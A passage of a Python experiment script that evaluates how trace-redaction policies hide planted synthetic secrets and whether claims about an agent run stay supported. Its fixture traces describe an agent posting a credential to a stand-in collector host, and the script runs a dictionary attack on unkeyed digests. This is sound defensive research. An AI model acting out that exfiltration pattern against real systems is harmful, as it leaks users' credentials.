"""PF Experiment A - the redaction triple (recall, claim survival, abstention).

Status: DESIGNED 2026-11-12, NOT YET EXECUTED. Same-team, deterministic,
constructed corpus. Private research evidence, not a benchmark claim.

Run from the repository root (no network, no model/provider calls):

    uv run python <path-to-this-file> <out.json> [--work-dir DIR]

Expected resources: < 150 MB peak working set, < 60 s on the reference Windows
host (192 tiny trace packages of <= 8 events each). A guard aborts the run if
the process peak working set exceeds --max-rss-mb (default 300).

What it measures, for each redaction/disclosure policy and each claim type:

* redaction recall   - fraction of planted sensitive values NOT recoverable in
                       plaintext from the exported artifact by a reader without
                       keys (plaintext search over decompressed export bytes,
                       plus a low-entropy dictionary attack on unkeyed digests);
                       reported separately "if the key is compromised";
* claim survival     - fraction of claims the claim-conditioned fidelity
                       assessor still marks `supported` (and, separately,
                       `weakened`);
* abstention rate    - fraction marked `inconclusive`;
* false support      - assessor says `supported` while a path-level ground
                       truth says mandatory evidence is unavailable;
* ablation           - the same with the redaction-awareness gate removed
                       (require_full_content=False, allow_redacted=True, the
                       transformation used by the Topics 04-06 study).

Implementation sources (no library feature is invented here):

* sova.trace.TraceWriter / TraceReader / RedactionPolicy / Redactor /
  RedactionVerifier / decrypt_placeholder  (shipped library);
* sova.trace.TraceReader.disclosure_view  (shipped library, unsigned view);
* private.experiments.prototypes.fidelity.assess_fidelity /
  dependency_closure / build_disclosure_bundle / verify_disclosed_events
  (PRIVATE PROTOTYPE - claim-conditioned fidelity and causal-closure
  disclosure are not part of the shipped `sova` package).

Policies P0, P2 and P8r are explicitly labelled counterfactual baselines that
SOVA does not implement (TraceWriter always redacts at capture, and the reader
rejects residual secret-shaped fields).
"""

from __future__ import annotations

import argparse
import copy
import hashlib
import json
import platform
import random
import sys
import tempfile
import time
import tracemalloc
import types
import zipfile
from collections import Counter
from dataclasses import asdict, dataclass, field
from datetime import UTC, datetime
from pathlib import Path
from typing import Any, Mapping, Sequence

ARTIFACT_TYPE = "sova.private.pf-exp-a-redaction-triple"
SCHEMA_VERSION = "0.1.0"
SEED = 20_261_112
DEFAULT_REPLICATES = 8
PADDING_BYTES = 64
KEY_ID = "pf-exp-a-synthetic-key"
PIN_DICTIONARY = tuple(f"synthetic-pin-{index:04d}" for index in range(100))
SUPPORT_RANK = {"inconclusive": 0, "weakened": 1, "supported": 2}
TRUTH_RANK = {"ok": 0, "tolerated": 1, "unavailable": 2}
_ABSENT = object()

# Which sensitive value sits in the exfiltrating tool call, per corpus variant.
VARIANTS = ("key-named", "value-shaped", "generic-unshaped", "low-entropy-key-named")
EXFIL_FIELD = {
    "key-named": "api_key",
    "value-shaped": "header",
    "generic-unshaped": "body",
    "low-entropy-key-named": "session_pin",
}

# Populated by _bootstrap() once the repository root is on sys.path.
API = types.SimpleNamespace()


# --------------------------------------------------------------------------- setup


def _bootstrap(repo_root: Path) -> None:
    prototype = repo_root / "private" / "experiments" / "prototypes" / "fidelity.py"
    if not prototype.is_file() or not (repo_root / "src" / "sova").is_dir():
        raise SystemExit(
            f"--repo-root {repo_root} is not the SOVA checkout "
            "(expected src/sova and private/experiments/prototypes/fidelity.py)"
        )
    if str(repo_root) not in sys.path:
        sys.path.insert(0, str(repo_root))
    from private.experiments.prototypes import fidelity  # noqa: PLC0415
    from sova import __version__  # noqa: PLC0415
    from sova.formats import canonical_json_bytes, sha256_digest  # noqa: PLC0415
    from sova.formats.errors import FormatError  # noqa: PLC0415
    from sova.trace import TraceReader, TraceWriter  # noqa: PLC0415
    from sova.trace.redaction import (  # noqa: PLC0415
        RedactionPolicy,
        RedactionVerifier,
        Redactor,
        decrypt_placeholder,
    )

    API.fidelity = fidelity
    API.sova_version = __version__
    API.canonical_json_bytes = canonical_json_bytes
    API.sha256_digest = sha256_digest
    API.FormatError = FormatError
    API.TraceReader = TraceReader
    API.TraceWriter = TraceWriter
    API.RedactionPolicy = RedactionPolicy
    API.RedactionVerifier = RedactionVerifier
    API.Redactor = Redactor
    API.decrypt_placeholder = decrypt_placeholder
    # Deterministic synthetic keys; never real key material.
    API.commitment_key = hashlib.sha256(f"pf-exp-a/commitment/{SEED}".encode()).digest()
    API.encryption_key = hashlib.sha256(f"pf-exp-a/encryption/{SEED}".encode()).digest()


def _peak_working_set_bytes() -> int | None:
    """Best-effort process peak resident memory without third-party packages."""
    if sys.platform == "win32":
        try:
            import ctypes  # noqa: PLC0415
            from ctypes import wintypes  # noqa: PLC0415

            class _Counters(ctypes.Structure):
                _fields_ = [  # noqa: RUF012
                    ("cb", wintypes.DWORD),
                    ("PageFaultCount", wintypes.DWORD),
                    ("PeakWorkingSetSize", ctypes.c_size_t),
                    ("WorkingSetSize", ctypes.c_size_t),
                    ("QuotaPeakPagedPoolUsage", ctypes.c_size_t),
                    ("QuotaPagedPoolUsage", ctypes.c_size_t),
                    ("QuotaPeakNonPagedPoolUsage", ctypes.c_size_t),
                    ("QuotaNonPagedPoolUsage", ctypes.c_size_t),
                    ("PagefileUsage", ctypes.c_size_t),
                    ("PeakPagefileUsage", ctypes.c_size_t),
                ]

            kernel32 = ctypes.WinDLL("kernel32")
            psapi = ctypes.WinDLL("psapi")
            kernel32.GetCurrentProcess.restype = wintypes.HANDLE
            psapi.GetProcessMemoryInfo.argtypes = [
                wintypes.HANDLE,
                ctypes.POINTER(_Counters),
                wintypes.DWORD,
            ]
            psapi.GetProcessMemoryInfo.restype = wintypes.BOOL
            counters = _Counters()
            counters.cb = ctypes.sizeof(_Counters)
            if psapi.GetProcessMemoryInfo(
                kernel32.GetCurrentProcess(), ctypes.byref(counters), counters.cb
            ):
                return int(counters.PeakWorkingSetSize)
        except Exception:  # noqa: BLE001 - diagnostics only
            return None
        return None
    try:
        import resource  # noqa: PLC0415

        peak = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        return int(peak) * (1 if sys.platform == "darwin" else 1024)
    except Exception:  # noqa: BLE001 - diagnostics only
        return None


def _memory_guard(limit_bytes: int) -> None:
    peak = _peak_working_set_bytes()
    if peak is not None and peak > limit_bytes:
        raise SystemExit(
            f"aborting: process peak working set {peak} bytes exceeds the "
            f"{limit_bytes}-byte guard; no result file was written"
        )


# ------------------------------------------------------------------------ corpus


@dataclass(frozen=True, slots=True)
class PlantedValue:
    event_kind: str
    path: str  # Redactor-style path, e.g. "$.arguments.api_key"
    value: str
    detector_route: str  # "key-name" | "value-pattern" | "none"
    entropy: str  # "high" | "low" (low = member of the 100-entry dictionary)

    @property
    def value_class(self) -> str:
        return f"{self.detector_route}/{self.entropy}"


@dataclass(frozen=True, slots=True)
class TraceSpec:
    index: int
    replicate: int
    variant: str
    events: tuple[tuple[str, dict[str, Any], tuple[int, ...]], ...]
    planted: tuple[PlantedValue, ...]


def _hex(rng: random.Random, size: int) -> str:
    return rng.randbytes(size).hex()


def _trace_specs(replicates: int) -> list[TraceSpec]:
    rng = random.Random(SEED)
    specs: list[TraceSpec] = []
    for replicate in range(replicates):
        for variant in VARIANTS:
            index = len(specs)
            pin_memory, pin_exfil = rng.sample(PIN_DICTIONARY, 2)
            generic_prompt = f"synthetic-private-value-{_hex(rng, 8)}"
            generic_environment = f"synthetic-private-value-{_hex(rng, 8)}"
            response_bearer = f"Bearer {_hex(rng, 16)}"
            github_shaped = f"ghp_{_hex(rng, 18)}"
            if variant == "key-named":
                secret, route, entropy = f"sk-{_hex(rng, 12)}", "key-name", "high"
            elif variant == "value-shaped":
                secret, route, entropy = f"Bearer {_hex(rng, 16)}", "value-pattern", "high"
            elif variant == "generic-unshaped":
                secret, route, entropy = (
                    f"synthetic-private-value-{_hex(rng, 8)}",
                    "none",
                    "high",
                )
            else:
                secret, route, entropy = pin_exfil, "key-name", "low"
            field = EXFIL_FIELD[variant]
            events = (
                ("run.started", {"scenario": f"pf-exp-a-{index:03d}", "variant": variant}, ()),
                (
                    "prompt.sent",
                    {
                        "text": "Summarise the support ticket and file the follow-up.",
                        "user_note": generic_prompt,
                    },
                    (0,),
                ),
                (
                    "memory.read",
                    {"key": "customer-profile", "session_pin": pin_memory},
                    (1,),
                ),
                (
                    "tool.called",
                    {
                        "name": "http.post",
                        "arguments": {"url": "https://collector.invalid/upload", field: secret},
                    },
                    (1, 2),
                ),
                (
                    "tool.completed",
                    {"status": "succeeded", "http_status": 200, "authorization": response_bearer},
                    (3,),
                ),
                ("environment.observed", {"note": generic_environment, "ref": github_shaped}, ()),
                (
                    "oracle.completed",
                    {"label": "credential-exfiltrated", "canary_match": True},
                    (3, 4),
                ),
                ("run.completed", {"completion": "completed"}, (6,)),
            )
            planted = (
                PlantedValue("prompt.sent", "$.user_note", generic_prompt, "none", "high"),
                PlantedValue("memory.read", "$.session_pin", pin_memory, "key-name", "low"),
                PlantedValue("tool.called", f"$.arguments.{field}", secret, route, entropy),
                PlantedValue(
                    "tool.completed", "$.authorization", response_bearer, "key-name", "high"
                ),
                PlantedValue("environment.observed", "$.note", generic_environment, "none", "high"),
                PlantedValue(
                    "environment.observed", "$.ref", github_shaped, "value-pattern", "high"
                ),
            )
            specs.append(TraceSpec(index, replicate, variant, events, planted))
    return specs


# ------------------------------------------------------------------------ claims


@dataclass(frozen=True, slots=True)
class RequirementSpec:
    id: str
    event_kind: str
    truth_paths: tuple[tuple[str, ...], ...]  # "{exfil}" is resolved per variant
    parent_kind: str | None = None
    allow_redacted: bool = False
    mandatory: bool = True


@dataclass(frozen=True, slots=True)
class ClaimSpec:
    id: str
    claim_type: str
    description: str
    requirements: tuple[RequirementSpec, ...]


CLAIMS = (
    ClaimSpec(
        "K1-exfil-value",
        "sensitive-required",
        "The agent sent the planted value to the collector (content needed).",
        (
            RequirementSpec(
                "exfil-call", "tool.called", (("arguments", "{exfil}"),), "prompt.sent"
            ),
            RequirementSpec("verdict", "oracle.completed", (("label",),), "tool.completed"),
        ),
    ),
    ClaimSpec(
        "K2-exfil-value-redaction-tolerant",
        "sensitive-required",
        "As K1, but the producer declares a typed placeholder acceptable.",
        (
            RequirementSpec(
                "exfil-call",
                "tool.called",
                (("arguments", "{exfil}"),),
                "prompt.sent",
                allow_redacted=True,
            ),
            RequirementSpec("verdict", "oracle.completed", (("label",),), "tool.completed"),
        ),
    ),
    ClaimSpec(
        "K3-call-completed",
        "sensitive-adjacent",
        "The exfiltrating call completed; depends on a non-sensitive field of an "
        "event that also carries a secret.",
        (RequirementSpec("completion", "tool.completed", (("status",),), "tool.called"),),
    ),
    ClaimSpec(
        "K4-oracle-verdict",
        "non-sensitive",
        "The deterministic oracle recorded the exfiltration verdict.",
        (RequirementSpec("verdict", "oracle.completed", (("label",), ("canary_match",))),),
    ),
    ClaimSpec(
        "K5-memory-access",
        "sensitive-adjacent",
        "The agent read the customer profile from memory (non-sensitive key; the "
        "same event carries a PIN).",
        (RequirementSpec("memory-read", "memory.read", (("key",),)),),
    ),
    ClaimSpec(
        "K6-verdict-with-optional-memory",
        "optional-sensitive",
        "Oracle verdict with optional supporting memory content (the PIN).",
        (
            RequirementSpec("verdict", "oracle.completed", (("label",),), "tool.completed"),
            RequirementSpec(
                "memory-pin", "memory.read", (("session_pin",),), mandatory=False
            ),
        ),
    ),
)


def _evidence_requirements(claim: ClaimSpec, *, ablate_redaction_gate: bool) -> tuple[Any, ...]:
    requirement_type = API.fidelity.EvidenceRequirement
    return tuple(
        requirement_type(
            item.id,
            item.event_kind,
            minimum=1,
            require_full_content=not ablate_redaction_gate,
            allow_redacted=True if ablate_redaction_gate else item.allow_redacted,
            mandatory=item.mandatory,
            parent_kind=item.parent_kind,
        )
        for item in claim.requirements
    )


# ---------------------------------------------------------------------- policies

POLICIES: tuple[dict[str, Any], ...] = (
    {
        "id": "P0-raw-unredacted",
        "label": "No redaction",
        "implementedBy": "experiment-constructed in-memory events (counterfactual)",
        "sovaImplements": False,
        "exportUnit": "trace",
    },
    {
        "id": "P1-omit-secrets-default",
        "label": "Omit detected secrets (public-export default)",
        "implementedBy": "sova.trace.TraceWriter(redaction_policy=RedactionPolicy())",
        "sovaImplements": True,
        "exportUnit": "trace",
    },
    {
        "id": "P2-unkeyed-digest",
        "label": "Unkeyed SHA-256 digest placeholder",
        "implementedBy": "same Redactor detector; placeholder augmented with "
        "sha256(canonical value) in memory (counterfactual)",
        "sovaImplements": False,
        "exportUnit": "trace",
    },
    {
        "id": "P3-keyed-commitment",
        "label": "Keyed HMAC commitment",
        "implementedBy": "sova.trace.TraceWriter(redaction_policy="
        "RedactionPolicy(method='keyed-commitment'))",
        "sovaImplements": True,
        "exportUnit": "trace",
    },
    {
        "id": "P4-encrypted",
        "label": "AES-256-GCM encrypted placeholder, unpadded",
        "implementedBy": "sova.trace.TraceWriter(redaction_policy="
        "RedactionPolicy(method='encrypted'))",
        "sovaImplements": True,
        "exportUnit": "trace",
    },
    {
        "id": "P5-encrypted-padded-64",
        "label": "AES-256-GCM with authenticated 64-byte padding",
        "implementedBy": "sova.trace.TraceWriter(redaction_policy=RedactionPolicy("
        "method='encrypted', encryption_padding_bytes=64))",
        "sovaImplements": True,
        "exportUnit": "trace",
    },
    {
        "id": "P6-metadata-only",
        "label": "Full-content redaction (metadata-only capture)",
        "implementedBy": "sova.trace.TraceWriter(content_capture='metadata-only')",
        "sovaImplements": True,
        "exportUnit": "trace",
    },
    {
        "id": "P7-lite-profile",
        "label": "Lite capture profile (family omission) + omit secrets",
        "implementedBy": "sova.trace.TraceWriter(capture_profile='lite')",
        "sovaImplements": True,
        "exportUnit": "trace",
    },
    {
        "id": "P8-claim-closure-disclosure",
        "label": "Claim-dependency-closed selective disclosure over the P1 trace",
        "implementedBy": "private prototype fidelity.build_disclosure_bundle "
        "(salted commitments for undisclosed events)",
        "sovaImplements": "private-prototype",
        "exportUnit": "claim-bundle",
    },
    {
        "id": "P8r-claim-closure-disclosure-over-raw",
        "label": "Closure disclosure over unredacted events",
        "implementedBy": "private prototype fidelity.build_disclosure_bundle over P0 "
        "events (counterfactual)",
        "sovaImplements": False,
        "exportUnit": "claim-bundle",
    },
    {
        "id": "P9a-disclosure-view-with-payload",
        "label": "Library unsigned disclosure view, closure sequences, payloads",
        "implementedBy": "sova.trace.TraceReader.disclosure_view(include_payload=True) "
        "over P1; naive receiver accepts the view as integrity-valid",
        "sovaImplements": True,
        "exportUnit": "claim-bundle",
    },
    {
        "id": "P9b-disclosure-view-without-payload",
        "label": "Library unsigned disclosure view, closure sequences, no payloads",
        "implementedBy": "sova.trace.TraceReader.disclosure_view(include_payload=False) "
        "over P1; naive receiver accepts the view as integrity-valid",
        "sovaImplements": True,
        "exportUnit": "claim-bundle",
    },
)
POLICY_IDS = tuple(item["id"] for item in POLICIES)


def _writer_config(policy_id: str) -> tuple[str, str, Any]:
    policy_type = API.RedactionPolicy
    if policy_id == "P1-omit-secrets-default":
        return "standard", "full", policy_type()
    if policy_id == "P3-keyed-commitment":
        return (
            "standard",
            "full",
            policy_type(
                method="keyed-commitment", commitment_key=API.commitment_key, key_id=KEY_ID
            ),
        )
    if policy_id == "P4-encrypted":
        return (
            "standard",
            "full",
            policy_type(method="encrypted", encryption_key=API.encryption_key, key_id=KEY_ID),
        )
    if policy_id == "P5-encrypted-padded-64":
        return (
            "standard",
            "full",
            policy_type(
                method="encrypted",
                encryption_key=API.encryption_key,
                encryption_padding_bytes=PADDING_BYTES,
                key_id=KEY_ID,
            ),
        )
    if policy_id == "P6-metadata-only":
        return "standard", "metadata-only", policy_type()
    if policy_id == "P7-lite-profile":
        return "lite", "full", policy_type()
    raise KeyError(policy_id)


WRITER_POLICIES = (
    "P1-omit-secrets-default",
    "P3-keyed-commitment",
    "P4-encrypted",
    "P5-encrypted-padded-64",
    "P6-metadata-only",
    "P7-lite-profile",
)

# ------------------------------------------------------------------ path helpers


def _segments(path: str) -> list[str] | None:
    """Parse the Redactor dict-only path subset ("$", "$.a.b"); lists unsupported."""
    if path == "$":
        return []
    if not path.startswith("$.") or "[" in path:
        return None
    return path[2:].split(".")


def _get(value: Any, segments: Sequence[str]) -> Any:
    current = value
    for segment in segments:
        if not isinstance(current, Mapping) or segment not in current:
            return _ABSENT
        current = current[segment]
    return current


def _nest(segments: Sequence[str], leaf: Any) -> Any:
    value = leaf
    for segment in reversed(segments):
        value = {segment: value}
    return value


def _is_placeholder(value: Any) -> bool:
    return isinstance(value, Mapping) and isinstance(value.get("$redacted"), Mapping)


def _markers(value: Any, path: str, found: list[tuple[str, Mapping[str, Any]]]) -> None:
    if isinstance(value, Mapping):
        if _is_placeholder(value):
            found.append((path, value))
            return
        for key, child in value.items():
            _markers(child, f"{path}.{key}", found)
    elif isinstance(value, list):
        for position, child in enumerate(value):
            _markers(child, f"{path}[{position}]", found)


def _json_bytes(value: Any) -> bytes:
    return json.dumps(value, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode(
        "utf-8"
    )


def _rate(numerator: int, denominator: int) -> str | None:
    return f"{numerator / denominator:.6f}" if denominator else None


# ------------------------------------------------------------------ export views


@dataclass(slots=True)
class ExportView:
    policy_id: str
    claim_scope: str | None  # None = trace-level export evaluated for every claim
    events: list[dict[str, Any]]
    manifest: dict[str, Any]
    integrity_valid: bool
    export_bytes: bytes
    context_id: str | None  # keyed-commitment context (trace id) where relevant


COUNTERFACTUAL_MANIFEST = {
    "captureProfile": "x-counterfactual-in-memory",
    "capturePolicy": {"includedFamilies": ["*"], "droppedEventCount": 0},
}


def _raw_events(spec: TraceSpec) -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    for sequence, (kind, payload, parents) in enumerate(spec.events):
        events.append(
            {
                "id": f"raw-{spec.index:03d}-{sequence}",
                "sequence": sequence,
                "kind": kind,
                "parents": [f"raw-{spec.index:03d}-{parent}" for parent in parents],
                "payload": copy.deepcopy(payload),
                "redactions": [],
            }
        )
    return events


def _unkeyed_digest_events(raw_events: Sequence[Mapping[str, Any]]) -> list[dict[str, Any]]:
    redactor = API.Redactor(API.RedactionPolicy())
    events: list[dict[str, Any]] = []
    for event in raw_events:
        redacted, records = redactor.redact(copy.deepcopy(event["payload"]))
        for record in records:
            segments = _segments(record["path"])
            if segments is None:
                raise RuntimeError(f"unsupported redaction path {record['path']!r}")
            original = _get(event["payload"], segments)
            holder = redacted if not segments else _get(redacted, segments)
            holder["$redacted"]["method"] = "x-unkeyed-digest"
            holder["$redacted"]["digest"] = API.sha256_digest(
                API.canonical_json_bytes(original)
            )
            record["method"] = "x-unkeyed-digest"
        events.append({**copy.deepcopy(dict(event)), "payload": redacted, "redactions": records})
    return events


def _write_trace(work: Path, spec: TraceSpec, policy_id: str) -> Path:
    profile, content, policy = _writer_config(policy_id)
    destination = work / f"t{spec.index:03d}-{policy_id}.sova-trace"
    writer = API.TraceWriter(
        destination,
        capture_profile=profile,
        content_capture=content,
        durability="lite",
        redaction_policy=policy,
        environment={
            "platform": "pf-exp-a-synthetic",
            "python": platform.python_version(),
            "codeDigest": None,
            "model": None,
            "dependencies": [],
        },
    )
    identifiers: list[str | None] = []
    for kind, payload, parents in spec.events:
        parent_ids = [identifiers[i] for i in parents if identifiers[i] is not None]
        identifiers.append(writer.append(kind, copy.deepcopy(payload), parents=parent_ids))
    writer.finalize()
    return destination


def _zip_bytes(path: Path) -> bytes:
    with zipfile.ZipFile(path) as archive:
        return b"\n".join(archive.read(name) for name in sorted(archive.namelist()))


def _read_trace(path: Path) -> tuple[Any, list[dict[str, Any]], dict[str, Any], bool]:
    reader = API.TraceReader(path)
    try:
        reader.verify()
        return reader, reader.events(), reader.manifest(), True
    except API.FormatError:
        return reader, [], {}, False


def _closure_seed_ids(events: Sequence[Mapping[str, Any]], claim: ClaimSpec) -> list[str]:
    kinds = {item.event_kind for item in claim.requirements}
    return [str(event["id"]) for event in events if event.get("kind") in kinds]


def _bundle_view(
    policy_id: str,
    claim: ClaimSpec,
    events: list[dict[str, Any]],
    manifest: dict[str, Any],
    source_digest: str,
    nonce_rng: random.Random,
) -> ExportView:
    bundle = API.fidelity.build_disclosure_bundle(
        claim_id=claim.id,
        source_trace_digest=source_digest,
        events=events,
        disclose_event_ids=_closure_seed_ids(events, claim),
        nonce_factory=nonce_rng.randbytes,
    )
    revealed = [dict(item.event) for item in bundle.commitments if item.event is not None]
    return ExportView(
        policy_id,
        claim.id,
        revealed,
        manifest,
        bool(API.fidelity.verify_disclosed_events(bundle)),
        _json_bytes(asdict(bundle)),
        None,
    )


def _disclosure_view(
    policy_id: str,
    claim: ClaimSpec,
    reader: Any,
    events: list[dict[str, Any]],
    manifest: dict[str, Any],
    *,
    include_payload: bool,
) -> ExportView:
    closure = set(
        API.fidelity.dependency_closure(events, seed_event_ids=_closure_seed_ids(events, claim))
    )
    sequences = {int(event["sequence"]) for event in events if event["id"] in closure}
    view = reader.disclosure_view(sequences=sequences, include_payload=include_payload)
    return ExportView(
        policy_id,
        claim.id,
        [dict(item) for item in view["events"]],
        manifest,  # receiver also holds the source manifest (capture policy)
        True,  # naive receiver: the view self-declares it is not a proof
        _json_bytes(view),
        None,
    )


# --------------------------------------------------------------------- recovery


_DIGEST_TO_PIN: dict[str, str] = {}


def _unkeyed_dictionary() -> dict[str, str]:
    if not _DIGEST_TO_PIN:
        for candidate in PIN_DICTIONARY:
            digest = API.sha256_digest(API.canonical_json_bytes(candidate))
            _DIGEST_TO_PIN[digest] = candidate
    return _DIGEST_TO_PIN


def _keyed_commitment(segments: Sequence[str], candidate: str, context_id: str) -> str | None:
    policy = API.RedactionPolicy(
        method="keyed-commitment", commitment_key=API.commitment_key, key_id=KEY_ID
    )
    redacted, _records = API.Redactor(policy, context_id=context_id).redact(
        _nest(segments, candidate)
    )
    holder = _get(redacted, segments)
    if not _is_placeholder(holder):
        return None
    commitment = holder["$redacted"].get("commitment")
    return commitment if isinstance(commitment, str) else None


def _recovered(view: ExportView, *, compromised: bool) -> tuple[set[str], Counter[str]]:
    """Return plaintext strings an attacker recovers from one export, with routes."""
    recovered: set[str] = set()
    routes: Counter[str] = Counter()
    markers: list[tuple[str, Mapping[str, Any]]] = []
    for event in view.events:
        payload = event.get("payload", _ABSENT)
        if payload is not _ABSENT:
            _markers(payload, "$", markers)
    dictionary = _unkeyed_dictionary()
    for path, holder in markers:
        marker = holder["$redacted"]
        digest = marker.get("digest")
        if isinstance(digest, str) and digest in dictionary:
            recovered.add(dictionary[digest])
            routes["unkeyed-digest-dictionary"] += 1
        if not compromised:
            continue
        commitment = marker.get("commitment")
        segments = _segments(path)
        if isinstance(commitment, str) and view.context_id and segments:
            for candidate in PIN_DICTIONARY:
                if _keyed_commitment(segments, candidate, view.context_id) == commitment:
                    recovered.add(candidate)
                    routes["keyed-commitment-dictionary-with-key"] += 1
                    break
        if marker.get("method") == "encrypted":
            try:
                value = API.decrypt_placeholder(dict(holder), encryption_key=API.encryption_key)
            except API.FormatError:
                routes["decrypt-failed"] += 1
            else:
                if isinstance(value, str):
                    recovered.add(value)
                    routes["decrypted-with-key"] += 1
    return recovered, routes


# ------------------------------------------------------------------ ground truth


def _resolve_paths(requirement: RequirementSpec, variant: str) -> list[tuple[str, ...]]:
    return [
        tuple(EXFIL_FIELD[variant] if part == "{exfil}" else part for part in path)
        for path in requirement.truth_paths
    ]


def _lookup(payload: Any, path: Sequence[str]) -> tuple[str, Any]:
    if payload is _ABSENT:
        return "missing", None
    current = payload
    if _is_placeholder(current):
        return "placeholder", None
    for part in path:
        if not isinstance(current, Mapping) or part not in current:
            return "missing", None
        current = current[part]
        if _is_placeholder(current):
            return "placeholder", None
    return "value", current


def _requirement_truth(
    requirement: RequirementSpec,
    events: Sequence[Mapping[str, Any]],
    raw_by_kind: Mapping[str, Mapping[str, Any]],
    variant: str,
) -> str:
    """Path-level availability of the evidence the claim actually depends on."""
    selected = [event for event in events if event.get("kind") == requirement.event_kind]
    if not selected:
        return "unavailable"
    if requirement.parent_kind is not None:
        by_id = {event.get("id"): event for event in events}
        for event in selected:
            parents = event.get("parents")
            if not isinstance(parents, list) or not any(
                by_id.get(parent, {}).get("kind") == requirement.parent_kind
                for parent in parents
            ):
                return "unavailable"
    status = "ok"
    raw_payload = raw_by_kind[requirement.event_kind]["payload"]
    for event in selected:
        for path in _resolve_paths(requirement, variant):
            found, value = _lookup(event.get("payload", _ABSENT), path)
            if found == "value" and value == _get(raw_payload, path):
                continue
            if found == "placeholder" and requirement.allow_redacted:
                status = "tolerated"
                continue
            return "unavailable"
    return status


def _claim_truth(
    claim: ClaimSpec,
    events: Sequence[Mapping[str, Any]],
    raw_by_kind: Mapping[str, Mapping[str, Any]],
    variant: str,
) -> str:
    statuses = [
        (item, _requirement_truth(item, events, raw_by_kind, variant))
        for item in claim.requirements
    ]
    if any(item.mandatory and status == "unavailable" for item, status in statuses):
        return "inconclusive"
    if any(
        (item.mandatory and status == "tolerated") or (not item.mandatory and status != "ok")
        for item, status in statuses
    ):
        return "weakened"
    return "supported"


# ------------------------------------------------------------------- tallies


@dataclass(slots=True)
class PolicyTally:
    exports: int = 0
    verification_failures: int = 0
    planted: Counter[str] = field(default_factory=Counter)
    hidden: Counter[str] = field(default_factory=Counter)
    hidden_if_compromised: Counter[str] = field(default_factory=Counter)
    routes: Counter[str] = field(default_factory=Counter)
    routes_if_compromised: Counter[str] = field(default_factory=Counter)
    decisions: Counter[tuple[str, str]] = field(default_factory=Counter)
    truths: Counter[tuple[str, str]] = field(default_factory=Counter)
    ablation: Counter[tuple[str, str]] = field(default_factory=Counter)
    pairs: Counter[tuple[str, str, str, str]] = field(default_factory=Counter)
    ablation_pairs: Counter[tuple[str, str, str, str]] = field(default_factory=Counter)


COMPROMISE_POLICIES = {"P3-keyed-commitment", "P4-encrypted", "P5-encrypted-padded-64"}


def _evaluate_view(
    view: ExportView,
    spec: TraceSpec,
    raw_by_kind: Mapping[str, Mapping[str, Any]],
    tally: PolicyTally,
    supports: dict[tuple[str, int, str], str],
) -> None:
    tally.exports += 1
    if not view.integrity_valid:
        tally.verification_failures += 1
    recovered, routes = _recovered(view, compromised=False)
    for item in spec.planted:
        tally.planted[item.value_class] += 1
        public_hit = item.value.encode("utf-8") in view.export_bytes or item.value in recovered
        if public_hit and item.value.encode("utf-8") in view.export_bytes:
            tally.routes["plaintext"] += 1
        if not public_hit:
            tally.hidden[item.value_class] += 1
    tally.routes.update(routes)
    if view.policy_id in COMPROMISE_POLICIES:
        compromised, compromise_routes = _recovered(view, compromised=True)
        tally.routes_if_compromised.update(compromise_routes)
        for item in spec.planted:
            hit = item.value.encode("utf-8") in view.export_bytes or item.value in compromised
            if not hit:
                tally.hidden_if_compromised[item.value_class] += 1

    claims = CLAIMS if view.claim_scope is None else [c for c in CLAIMS if c.id == view.claim_scope]
    for claim in claims:
        truth = _claim_truth(claim, view.events, raw_by_kind, spec.variant)
        outcomes = {}
        for ablate in (False, True):
            report = API.fidelity.assess_fidelity(
                claim_id=claim.id,
                requirements=_evidence_requirements(claim, ablate_redaction_gate=ablate),
                manifest=view.manifest,
                events=view.events,
                integrity_valid=view.integrity_valid,
                signature_verified=None,
            )
            outcomes[ablate] = report.support.value
        tally.decisions[(claim.claim_type, outcomes[False])] += 1
        tally.ablation[(claim.claim_type, outcomes[True])] += 1
        tally.truths[(claim.claim_type, truth)] += 1
        tally.pairs[(claim.id, spec.variant, outcomes[False], truth)] += 1
        tally.ablation_pairs[(claim.id, spec.variant, outcomes[True], truth)] += 1
        supports[(view.policy_id, spec.index, claim.id)] = outcomes[False]


def _decision_block(counter: Counter[tuple[str, str]], claim_type: str | None = None) -> dict:
    selected = Counter(
        {key: value for key, value in counter.items() if claim_type in (None, key[0])}
    )
    total = sum(selected.values())
    supported = sum(v for (_, label), v in selected.items() if label == "supported")
    weakened = sum(v for (_, label), v in selected.items() if label == "weakened")
    inconclusive = sum(v for (_, label), v in selected.items() if label == "inconclusive")
    return {
        "total": total,
        "supported": supported,
        "weakened": weakened,
        "inconclusive": inconclusive,
        "claimSurvivalRate": _rate(supported, total),
        "weakenedRate": _rate(weakened, total),
        "abstentionRate": _rate(inconclusive, total),
    }


def _safety_block(pairs: Counter[tuple[str, str, str, str]]) -> dict[str, Any]:
    total = sum(pairs.values())
    false_support = sum(
        v for (_, _, assessed, truth), v in pairs.items()
        if assessed == "supported" and truth == "inconclusive"
    )
    overclaim = sum(
        v for (_, _, assessed, truth), v in pairs.items()
        if SUPPORT_RANK[assessed] > SUPPORT_RANK[truth]
    )
    over_abstention = sum(
        v for (_, _, assessed, truth), v in pairs.items()
        if assessed == "inconclusive" and truth != "inconclusive"
    )
    agreement = sum(v for (_, _, assessed, truth), v in pairs.items() if assessed == truth)
    return {
        "total": total,
        "falseSupport": false_support,
        "overclaim": overclaim,
        "overAbstention": over_abstention,
        "exactAgreement": agreement,
        "agreementRate": _rate(agreement, total),
        "disagreements": [
            {
                "claim": claim,
                "variant": variant,
                "assessor": assessed,
                "truth": truth,
                "count": count,
            }
            for (claim, variant, assessed, truth), count in sorted(pairs.items())
            if assessed != truth
        ],
    }


def _recall_block(planted: Counter[str], hidden: Counter[str]) -> dict[str, Any]:
    total_planted = sum(planted.values())
    total_hidden = sum(hidden.values())
    return {
        "planted": total_planted,
        "notRecoverable": total_hidden,
        "recall": _rate(total_hidden, total_planted),
        "byValueClass": {
            value_class: {
                "planted": planted[value_class],
                "notRecoverable": hidden[value_class],
                "recall": _rate(hidden[value_class], planted[value_class]),
            }
            for value_class in sorted(planted)
        },
    }


# ---------------------------------------------------------------------- driver


MONOTONICITY_PAIRS = (
    ("P0-raw-unredacted", "P1-omit-secrets-default"),
    ("P1-omit-secrets-default", "P6-metadata-only"),
    ("P1-omit-secrets-default", "P7-lite-profile"),
    ("P1-omit-secrets-default", "P8-claim-closure-disclosure"),
    ("P1-omit-secrets-default", "P9a-disclosure-view-with-payload"),
